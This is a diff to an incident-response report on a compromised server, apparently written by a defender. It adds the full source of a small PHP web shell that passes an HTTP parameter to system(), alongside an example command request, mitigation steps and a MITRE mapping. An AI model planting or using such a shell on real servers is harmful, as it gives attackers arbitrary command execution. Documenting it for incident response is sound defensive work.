@@ -34,14 +34,29 @@ The threat actor gained initial access to the server via FTP and established per
 
 ### Remote code execution via web shell
 A PHP file was. The snippet in the screenshot below checks whether an HTTP parameter named z was provided (\$_REQUEST["z"]). If so, it prints a "pre" tag, assigns the parameter to \$z, and calls system(\$z). system() executes the string as a shell command on the server and returns output. *die* ends script execution after running the command. An attacker can send `http://victim/shell.php?z=whoami` (or other commands) and have the server run arbitrary shell commands as the web server user
-![alt text](image-3.png)
 
-The last activity performed by the user on Sept 3rd 09:25:25
-![Last Activity](image-4.png)
+Snippet observed:
+`<?php 
+if(isset($_REQUEST["z"])) {
+  echo "<pre>"; 
+  $z = ($_REQUEST["z"]); 
+  system($z); 
+  echo "</pre>"; 
+  die; 
+}
+?>`
+
+### Last Activity
+The attacker’s last observed activity occurred at Sept 3, 2021 – 09:25:25.
+![Last Activity](last_activity.png) 
 
 
 ## Mitigation Recommendations
-- Steps to remove, patch, block IPs, rotate creds
+- Rotate all service passwords and kill sessions for user account `ftpadam`
+- Block ip `110.44.125.139` at the firewall level
+- Remove the cron jobs created by the actor
+- Remove malicious PHP web shell
+
 
 ## MITRE ATT&CK Mapping
 - T1133 (initial access via remote services)
